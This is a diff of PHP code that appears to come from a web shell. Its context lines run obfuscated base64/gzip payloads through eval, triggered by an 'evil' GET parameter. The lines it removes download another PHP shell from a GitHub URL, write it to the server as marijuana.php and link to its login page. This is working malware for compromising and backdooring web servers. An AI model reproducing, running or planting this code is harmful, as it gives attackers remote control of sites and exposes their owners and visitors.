@@ -249,31 +249,6 @@ eval(gzinflate(base64_decode('pZdNTsMwEIXXReIOJpuWBbFA7Bp1A0vuULmO21R14sg/QG9P2p
 } elseif($_GET['evil'] == 'kill') {
 // Source codenya : https://ghostbin.co/paste/hyxr4/raw
 eval(gzinflate(base64_decode('U0nLzEnNzMtUsFVQiQ92DQpzDYpWD3YO8gwIiXfz9HH1c/R1VY+15uUqyk3JLNJQTy3LzCkpz8yLL67MVde0RhdNzs9LQxWOB4uXZeQXlwAlSvNyMvOyNVSgtmoCDU5NzshXULcpsHOqTE1VsFKy0S+wU7cGAA==')));
-} elseif($_GET['evil'] == 'hah') {
-$full = str_replace($_SERVER['DOCUMENT_ROOT'], "", $path);
-	function marijuana($url, $isi) {
-		$fp = fopen($isi, "w");
-		$ch = curl_init();
-		 	  curl_setopt($ch, CURLOPT_URL, $url);
-		 	  curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
-		 	  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-		 	  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
-		   	  curl_setopt($ch, CURLOPT_FILE, $fp);
-		return curl_exec($ch);
-		   	  curl_close($ch);
-		fclose($fp);
-		ob_flush();
-		flush();
-	}
-	if(file_exists('marijuana.php')) {
-		echo "<center><font><a href='$full/marijuana.php' target='_blank'>> marijuana LOGIN <</a></font></center>";
-	} else {
-		if(marijuana("https://raw.githubusercontent.com/BOTKNTL/kontol/master/maricoli.php","marijuana.php")) {
-			echo "<center><font><a href='$full/marijuana.php' target='_blank'>> marijuana LOGIN <</a></font></center>";
-		} else {
-			echo "<center><font>Failed to create file marijuana.</font></center>";
-		}
-	}
 }
 echo "</td></tr>";
 if(isset($_GET['filesrc'])){
